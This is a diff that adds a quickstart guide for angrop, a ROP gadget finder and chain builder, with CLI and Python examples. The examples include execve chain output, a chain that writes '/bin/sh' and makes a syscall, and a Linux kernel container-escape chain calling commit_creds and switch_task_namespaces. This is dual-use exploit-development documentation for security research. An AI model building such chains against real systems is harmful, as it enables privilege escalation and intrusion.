@@ -1,80 +1,329 @@
 ---
-title: "Quickstart"
-description: "Start building awesome documentation in minutes"
+title: Quickstart Guide
+description: Build your first ROP chain with angrop in minutes
 ---
 
-## Get started in three steps
+# Getting Started with angrop
 
-Get your documentation site running locally and make your first customization.
+This guide will walk you through using angrop to find gadgets and build ROP chains. We'll cover both the command-line interface and the Python API.
 
-### Step 1: Set up your local environment
+## Using the CLI
 
-<AccordionGroup>
-  <Accordion icon="copy" title="Clone your docs locally">
-    During the onboarding process, you created a GitHub repository with your docs content if you didn't already have one. You can find a link to this repository in your [dashboard](https://dashboard.mintlify.com).
+The `angrop-cli` command provides quick access to basic gadget finding and chain building.
+
+### Finding Gadgets
+
+To dump all gadgets in a binary:
+
+```bash
+angrop-cli dump /bin/ls
+```
+
+<CodeGroup>
+```bash Output Example
+0x11735: true  : adc bl, byte ptr [rbx + 0x4c]; mov eax, esp; pop r12; pop r13; pop r14; pop rbp; ret 
+0x10eaa: true  : adc eax, 0x12469; add rsp, 0x38; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret 
+0xe026: true  : adc eax, 0xcec8; pop rbx; cmove rax, rdx; pop r12; pop rbp; ret 
+0xdfd4: true  : adc eax, 0xcf18; pop rbx; cmove rax, rdx; pop r12; pop rbp; ret 
+...
+```
+</CodeGroup>
+
+The `true/false` indicator shows whether the gadget is self-contained (doesn't depend on previous register state).
+
+### Building Predefined Chains
+
+Generate an `execve` chain:
+
+```bash
+angrop-cli chain -t execve /bin/bash
+```
+
+<CodeGroup>
+```python Output
+code_base = 0x0
+chain = b""
+chain += p64(code_base + 0x36083)  # pop rax; pop rbx; pop rbp; ret 
+chain += p64(code_base + 0x30016)  # add rsp, 8; ret 
+chain += p64(code_base + 0x34873)
+chain += p64(code_base + 0x0)
+chain += p64(code_base + 0x9616d)  # mov edx, ebp; mov rsi, r12; mov rdi, rbx; call rax
+chain += p64(code_base + 0xe501e)  # pop rsi; ret 0
+chain += p64(code_base + 0x0)
+chain += p64(code_base + 0x31470)  # execve@plt
+chain += p64(0x0)
+chain += p64(code_base + 0x10d5bf)
+```
+</CodeGroup>
+
+You can copy this output directly into your exploit!
+
+## Using the Python API
+
+The Python API provides much more power and flexibility. Here's how to use it.
+
+### Basic Setup
+
+<Steps>
+  <Step title="Import and create project">
+    ```python
+    import angr
+    import angrop
     
-    To clone the repository locally so that you can make and preview changes to your docs, follow the [Cloning a repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) guide in the GitHub docs.
-  </Accordion>
-  <Accordion icon="rectangle-terminal" title="Start the preview server">
-    1. Install the Mintlify CLI: `npm i -g mint`
-    2. Navigate to your docs directory and run: `mint dev`
-    3. Open `http://localhost:3000` to see your docs live!
+    # Load the binary
+    p = angr.Project("/bin/ls")
     
-    <Tip>Your preview updates automatically as you edit files.</Tip>
-  </Accordion>
-</AccordionGroup>
-
-### Step 2: Deploy your changes
-
-<AccordionGroup>
-  <Accordion icon="github" title="Install our GitHub app">
-    Install the Mintlify GitHub app from your [dashboard](https://dashboard.mintlify.com/settings/organization/github-app).
+    # Initialize ROP analysis
+    rop = p.analyses.ROP()
+    ```
+  </Step>
+  
+  <Step title="Find gadgets">
+    ```python
+    # Find all ROP gadgets in the binary
+    rop.find_gadgets()
+    ```
     
-    Our GitHub app automatically deploys your changes to your docs site, so you don't need to manage deployments yourself.
-</Accordion>
-<Accordion icon="palette" title="Update your site name and colors">
-    For a first change, let's update the name and colors of your docs site.
+    This will show a progress bar while finding gadgets using multiple processes.
+  </Step>
+  
+  <Step title="Build a chain">
+    ```python
+    # Set register values
+    chain = rop.set_regs(rax=0x41414141, rbx=0x42424242)
+    
+    # Print the payload
+    chain.print_payload_code()
+    ```
+  </Step>
+</Steps>
 
-    1. Open `docs.json` in your editor.
-    2. Change the `"name"` field to your project name.
-    3. Update the `"colors"` to match your brand.
-    4. Save and see your changes instantly at `http://localhost:3000`.
+### Complete Example
 
-    <Tip>Try changing the primary color to see an immediate difference!</Tip>
-  </Accordion>
-</AccordionGroup>
+Here's a complete working example:
 
-### Step 3: Go live
+```python
+import angr
+import angrop
 
-<Accordion icon="rocket" title="Publish your docs">
-  1. Commit and push your changes.
-  2. Your docs will update and be live in moments!
-</Accordion>
+# Load binary
+p = angr.Project("/bin/ls")
 
-## Next steps
+# Initialize ROP analysis
+rop = p.analyses.ROP()
 
-Now that you have your docs running, explore these key features:
+# Find gadgets (shows progress bar)
+rop.find_gadgets()
 
-<CardGroup cols={2}>
+# Build a chain to set registers
+chain = rop.set_regs(rax=0x41414141, rbx=0x42424242)
 
-<Card title="Write Content" icon="pen-to-square" href="/essentials/markdown">
-  Learn MDX syntax and start writing your documentation.
-</Card>
+# Print the chain as Python code
+chain.print_payload_code()
+```
 
-<Card title="Customize style" icon="palette" href="/essentials/settings">
-  Make your docs match your brand perfectly.
-</Card>
+<CodeGroup>
+```python Output
+code_base = 0x0
+chain = b""
+chain += p64(code_base + 0xf5e2)   # pop rbx; pop r12; test eax, eax; pop rbp; cmovs eax, edx; ret 
+chain += p64(0x42424242)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(code_base + 0x812f)   # pop rsi; pop rbp; ret 
+chain += p64(0x41414141)
+chain += p64(0x0)
+chain += p64(code_base + 0x169dd)  # mov rax, rsi; ret 
+chain += p64(code_base + 0x10a55)
+```
+</CodeGroup>
 
-<Card title="Add code examples" icon="square-code" href="/essentials/code">
-  Include syntax-highlighted code blocks.
-</Card>
+## Common Chain Building Patterns
 
-<Card title="API documentation" icon="code" href="/api-reference/introduction">
-  Auto-generate API docs from OpenAPI specs.
-</Card>
+### Setting Registers
 
-</CardGroup>
+```python
+# Set multiple registers at once
+chain = rop.set_regs(rax=0x1337, rbx=0x56565656)
+```
+
+### Moving Registers
+
+```python
+# Move value from one register to another
+chain = rop.move_regs(rax='rdx')
+```
+
+### Writing to Memory
+
+```python
+# Write a string to memory
+chain = rop.write_to_mem(0x61b100, b"/bin/sh\0")
+```
+
+### Calling Functions
+
+```python
+# Call a function with arguments
+chain = rop.func_call("read", [0, 0x804f000, 0x100])
+```
+
+### Invoking Syscalls
+
+```python
+# Invoke a syscall with arguments
+chain = rop.do_syscall(0, [0, 0x41414141, 0x100], needs_return=False)
+```
+
+### Generating execve Chains
+
+```python
+# Generate an execve("/bin/sh", NULL, NULL) chain
+chain = rop.execve()
+```
+
+## Chaining Operations
+
+You can chain multiple operations together using `+`:
+
+```python
+chain = (
+    rop.write_to_mem(0x61b100, b"/bin/sh\0") +
+    rop.set_regs(rax=59, rdi=0x61b100, rsi=0, rdx=0) +
+    rop.do_syscall(59, [0x61b100, 0, 0])
+)
+```
+
+## Debugging Chains
+
+Use `pp()` to pretty-print a chain for debugging:
+
+```python
+chain = rop.set_regs(rax=0x1337, rbx=0x5656)
+chain.pp()
+```
+
+<CodeGroup>
+```text Output
+0x0000000000034573: pop rcx; ret 
+                    0x61b0f8
+0x000000000004a1dd: pop rdi; mov edx, 0x89480002; ret 
+                    0x68732f6e69622f
+0x00000000000d5a94: mov qword ptr [rcx + 8], rdi; ret 
+                    <BV64 next_pc_1081_64>
+```
+</CodeGroup>
+
+## Configuration Options
+
+Customize the ROP analysis with configuration options:
+
+```python
+rop = p.analyses.ROP(
+    only_check_near_rets=True,    # Only check blocks near returns (faster)
+    max_block_size=20,            # Maximum basic block size to consider
+    fast_mode=True,               # Skip complex gadgets for speed
+    kernel_mode=False             # Set True for kernel binaries
+)
+```
 
 <Note>
-  **Need help?** See our [full documentation](https://mintlify.com/docs) or join our [community](https://mintlify.com/community).
+  `fast_mode` defaults to `None`, which automatically decides based on binary size. For large binaries, it enables fast mode to skip gadgets with conditional branches, floating point operations, and jumps.
 </Note>
+
+## Bad Bytes
+
+Avoid bad bytes in your chain:
+
+```python
+# Avoid null bytes and newlines
+rop.set_badbytes([0x0, 0x0a])
+
+# All subsequent chains will avoid these bytes
+chain = rop.set_regs(rax=0x1337)
+```
+
+## Advanced Example: Kernel Exploitation
+
+Here's a real-world example for Linux kernel container escape:
+
+```python
+import angr
+import angrop
+
+# Load kernel image
+proj = angr.Project("./vmlinux_sym")
+
+# Configure for kernel mode
+rop = proj.analyses.ROP(
+    fast_mode=False,
+    only_check_near_rets=False,
+    max_block_size=12,
+    kernel_mode=True
+)
+
+# Find gadgets
+rop.find_gadgets()
+
+# Build container escape chain
+init_cred = 0xffffffff8368b220
+init_nsproxy = 0xffffffff8368ad00
+
+chain = (
+    rop.func_call("commit_creds", [init_cred]) +
+    rop.func_call("find_task_by_vpid", [1]) +
+    rop.move_regs(rdi='rax') +
+    rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) +
+    rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) +
+    rop.func_call('__x64_sys_fork', []) +
+    rop.func_call('msleep', [0xffffffff])
+)
+
+chain.print_payload_code()
+```
+
+## Performance Tips
+
+<CardGroup cols={2}>
+  <Card title="Use Caching" icon="floppy-disk">
+    ```python
+    # Save gadgets for reuse
+    rop.save_gadgets("/tmp/gadget_cache")
+    
+    # Load them later
+    rop.load_gadgets("/tmp/gadget_cache")
+    ```
+  </Card>
+  
+  <Card title="Adjust Process Count" icon="gears">
+    ```python
+    # Use more processes for faster finding
+    rop.find_gadgets(processes=16)
+    ```
+  </Card>
+  
+  <Card title="Optimize After Finding" icon="chart-line">
+    ```python
+    # Skip optimization during finding
+    rop.find_gadgets(optimize=False)
+    
+    # Optimize separately
+    rop.optimize(processes=16)
+    ```
+  </Card>
+  
+  <Card title="Use Fast Mode" icon="bolt">
+    ```python
+    # Enable fast mode for large binaries
+    rop = p.analyses.ROP(fast_mode=True)
+    ```
+  </Card>
+</CardGroup>
+
+## Next Steps
+
+Now that you know the basics:
+
+- Explore the [ROP class API](/api/rop) and [Chain Builder API](/api/chain-builder) for all available methods
+- Check out [Examples](/examples/simple-chain) for real-world use cases
+- Read about [advanced features](/guides/building-chains) like SROP, stack pivoting, and memory operations
